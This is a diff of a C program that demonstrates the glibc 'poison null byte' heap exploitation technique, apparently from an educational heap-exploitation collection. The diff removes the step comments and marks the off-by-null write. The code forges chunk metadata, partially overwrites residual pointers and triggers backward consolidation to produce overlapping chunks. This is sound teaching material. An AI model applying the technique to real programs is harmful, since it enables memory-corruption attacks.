@@ -42,20 +42,15 @@ int main()
 	setbuf(stdin, NULL);
 	setbuf(stdout, NULL);
 
-	puts("Welcome to poison null byte!");
-
-	// Step 1: Allocate padding to align heap
 	void *tmp = malloc(0x1);
 	void *heap_base = (void *)((long)tmp & (~0xfff));
 	size_t size = 0x10000 - ((long)tmp&0xffff) - 0x20;
 	void *padding = malloc(size);
 
-	// Step 2: Allocate adjacent chunks
-	void *prev = malloc(0x500); // The 'prev' chunk
-	void *victim = malloc(0x4f0); // The 'victim' chunk
-	malloc(0x10); // Barrier
+	void *prev = malloc(0x500); 
+	void *victim = malloc(0x4f0); 
+	malloc(0x10); 
 
-	// Step 3: Link 'prev' into largebin
 	void *a = malloc(0x4f0);
 	malloc(0x10);
 	void *b = malloc(0x510);
@@ -64,14 +59,12 @@ int main()
 	free(a);
 	free(b);
 	free(prev);
-	malloc(0x1000); // Trigger sorting
+	malloc(0x1000); 
 
-	// Step 4: Construct the fake chunk inside 'prev'
 	void *prev2 = malloc(0x500);
-	((long *)prev)[1] = 0x501; // Fake size
-	*(long *)(prev + 0x500) = 0x500; // Fake prev_size
+	((long *)prev)[1] = 0x501; 
+	*(long *)(prev + 0x500) = 0x500; 
 
-	// Step 5: Bypass unlinking using residual pointers
 	void *b2 = malloc(0x510);
 	((char*)b2)[0] = '\x10';
 	((char*)b2)[1] = '\x00';
@@ -84,18 +77,17 @@ int main()
 	((char*)a3)[8] = '\x10';
 	((char*)a3)[9] = '\x00';
 
-	// Step 6: Trigger the off-by-null
+	// VULNERABILITY: Off-by-null
 	void *victim2 = malloc(0x4f0);
 	((char *)victim2)[-8] = '\x00';
 
-	// Trigger backward consolidation
 	free(victim);
 
-	// Step 7: Validate chunk overlapping
 	void *merged = malloc(0x100);
 	memset(merged, 'A', 0x80);
 	memset(prev2, 'C', 0x80);
 	assert(strstr(merged, "CCCCCCCCC"));
+	return 0;
 }
 ```
 
